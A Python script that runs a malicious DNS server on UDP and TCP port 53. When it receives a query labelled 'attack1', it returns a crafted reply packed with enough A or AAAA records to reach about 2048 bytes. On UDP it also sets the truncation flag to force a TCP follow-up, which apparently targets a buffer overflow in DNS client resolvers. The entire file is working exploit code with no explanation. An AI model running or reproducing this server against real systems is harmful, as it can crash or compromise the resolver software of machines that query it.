#!/usr/bin/env python3

import socket
import struct
import threading
import time

from dnsutil import DNSParser, DNSMessage, DNSHeader, DNSQuestion, DNSRR, DNSFlags

HOST=""
PORT=53


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)


def attack1_udp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    namelen = len(request.questions[0].bytes()) - 4
    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 2048 // (namelen + 14)
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 4, bytes([i]*4)))

    # Type AAAA reply
    if rtype == 28:
        ancount = 2048 // (namelen + 26)
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 16, bytes([i]*16)))

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    return DNSMessage(header, [question], answers, [], [])


def attack1_tcp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    namelen = len(request.questions[0].bytes()) - 4
    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 2048 // (namelen + 14)
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 13, 4, bytes([i]*4)))

    # Type AAAA reply
    if rtype == 28:
        ancount = 2048 // (namelen + 26)
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 13, 16, bytes([i]*16)))

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    return DNSMessage(header, [question], answers, [], [])


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    while True:
        data, addr = sock.recvfrom(1024)
        print("[UDP] Datagram from {0}".format(addr[0]))

        # Parse DNS request
        tmp, request = DNSParser.parse_message(data)
        print("[UDP] {} bytes in: {}".format(len(data), request))

        # Execute selected attack
        if request.questions and request.questions[0].labels[0] == b"attack1":
            print("[UDP] Executing attack1 against {0}".format(addr[0]))
            reply = attack1_udp(request)
            data = reply.bytes()
            sock.sendto(data, addr)
            print("[UDP] {} bytes out: {}".format(len(data), reply))


def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    while True:
        conn, addr = sock.accept()
        print("[TCP] Connection from {0}".format(addr[0]))

        while True:
            # Read message length
            try:
                msglen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(msglen)
            except:
                print("[TCP] Disconnected from {0}".format(addr[0]))
                break

            # Parse DNS request header
            tmp, request = DNSParser.parse_message(data)
            print("[TCP] {} bytes in: {}".format(len(data), request))

            # Execute selected attack
            if request.questions and request.questions[0].labels[0] == b"attack1":
                print("[TCP] Executing attack1 against {0}".format(addr[0]))
                reply = attack1_tcp(request)
                data = reply.bytes()
                conn.sendall(dw(len(data)) + data)
                print("[TCP] {} bytes out: {}".format(len(data), reply))


if __name__ == "__main__":

    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            print("Starting UDP server...")
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.daemon = True
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            print("Starting TCP server...")
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()

        time.sleep(5)

